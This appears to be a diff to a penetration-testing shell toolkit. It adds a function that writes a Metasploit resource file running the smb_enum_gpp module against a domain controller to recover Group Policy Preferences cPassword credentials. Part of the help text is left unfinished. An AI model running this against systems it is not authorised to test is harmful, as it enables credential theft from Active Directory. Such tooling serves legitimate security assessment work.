@@ -13,6 +13,9 @@ The nb-ad-gpp namespace contains commands for
 Commands
 --------
 nb-ad-gpp-install         installs dependencies
+nb-ad-gpp-msf             use metasploit module to look for the cPassword
+nb-ad-gpp-
+nb-ad-gpp-
 
 DOC
 }
@@ -22,7 +25,7 @@ nb-ad-gpp-install() {
     __pkgs impacket
 }
 
-nb-ad-gpp-cme() {
+nb-ad-gpp-msf() {
     __check-project
 	  __check-domain
 	  __ask "Enter the IP address of the target DC server"
@@ -32,13 +35,9 @@ nb-ad-gpp-cme() {
     __ask "Enter a password for authentication"
     nb-vars-set-pass
 
-
-
-    local cmd="use auxiliary/scanner/smb/smb_enum_gpp; set RHOST ; run; exit "
-
     # Generate a random number for the file name
     rand=$(shuf -i 1000-9999 -n 1)
-    rc_file="/tmp/msf_listener_$rand.rc"
+    rc_file="/tmp/msf_smb_enum_gpp_$rand.rc"
 
     echo "use auxiliary/scanner/smb/smb_enum_gpp" > "$rc_file"
     echo "set RHOST ${__RHOST}" >> "$rc_file"
